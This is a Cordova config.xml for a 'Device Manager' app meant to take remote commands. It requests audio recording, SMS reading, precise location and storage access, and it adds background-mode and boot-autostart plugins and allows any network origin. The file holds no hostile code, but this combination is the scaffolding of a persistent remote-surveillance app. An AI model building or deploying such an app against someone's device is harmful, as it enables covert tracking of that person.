<?xml version='1.0' encoding='utf-8'?>
<widget id="com.example.deviceapp"
        version="1.0.0"
        xmlns="http://www.w3.org/ns/widgets"
        xmlns:cdv="http://cordova.apache.org/ns/1.0">

    <!-- اسم التطبيق -->
    <name>Device Manager</name>

    <!-- وصف التطبيق -->
    <description>
        Cordova app to manage device commands remotely.
    </description>

    <!-- المؤلف -->
    <author email="you@example.com" href="http://example.com">
        Your Name
    </author>

    <!-- الصفحة الرئيسية -->
    <content src="index.html" />

    <!-- إعدادات العرض -->
    <preference name="Fullscreen" value="false" />
    <preference name="Orientation" value="portrait" />
    <preference name="AndroidPersistentFileLocation" value="Compatibility" />
    <preference name="AndroidLaunchMode" value="singleTask" />
    <preference name="KeepRunning" value="true" />
    <preference name="BackgroundColor" value="0xffffffff" />
    <preference name="ShowSplashScreen" value="false" />
    <preference name="AutoHideSplashScreen" value="true" />

    <!-- أذونات أندرويد -->
    <platform name="android">
        <allow-intent href="market:*" />
        <allow-intent href="tel:*" />
        <allow-intent href="sms:*" />
        <allow-intent href="mailto:*" />

        <!-- Permissions تضاف مباشرة إلى AndroidManifest.xml -->
        <config-file parent="/*" target="AndroidManifest.xml">
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.RECORD_AUDIO" />
            <uses-permission android:name="android.permission.READ_SMS" />
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
        </config-file>

        <!-- إصلاح android:exported لمستقبلات autostart (بدون تكرار) -->
        <config-file target="AndroidManifest.xml" parent="/manifest/application/receiver[@android:name='com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver']">
            <receiver android:name="com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver"
                      android:exported="true" />
        </config-file>

        <config-file target="AndroidManifest.xml" parent="/manifest/application/receiver[@android:name='com.tonikorin.cordova.plugin.autostart.UserPresentReceiver']">
            <receiver android:name="com.tonikorin.cordova.plugin.autostart.UserPresentReceiver"
                      android:exported="true" />
        </config-file>

        <config-file target="AndroidManifest.xml" parent="/manifest/application/receiver[@android:name='com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver']">
            <receiver android:name="com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver"
                      android:exported="true" />
        </config-file>
    </platform>

    <!-- Plugins -->
    <plugin name="cordova-plugin-device" spec="^2.1.0" />
    <plugin name="cordova-plugin-geolocation" spec="^4.1.0" />
    <plugin name="cordova-plugin-file" spec="^6.0.2" />
    <plugin name="cordova-plugin-media" spec="^5.0.4" />
    <plugin name="cordova-plugin-background-mode" spec="https://github.com/katzer/cordova-plugin-background-mode.git" />
    <plugin name="cordova-plugin-autostart" spec="^2.3.0" />
    <plugin name="cordova-plugin-android-permissions" spec="^1.1.5" />
    <plugin name="cordova-sms-plugin" spec="https://github.com/cordova-sms/cordova-sms-plugin.git" />
    <plugin name="cordova-plugin-dialogs" spec="^2.0.2" />
    <plugin name="cordova-plugin-whitelist" spec="^1.3.4" />

    <!-- Whitelist لتمكين WebSocket -->
    <access origin="*" />
    <allow-navigation href="*" />
    <allow-intent href="*" />

</widget>
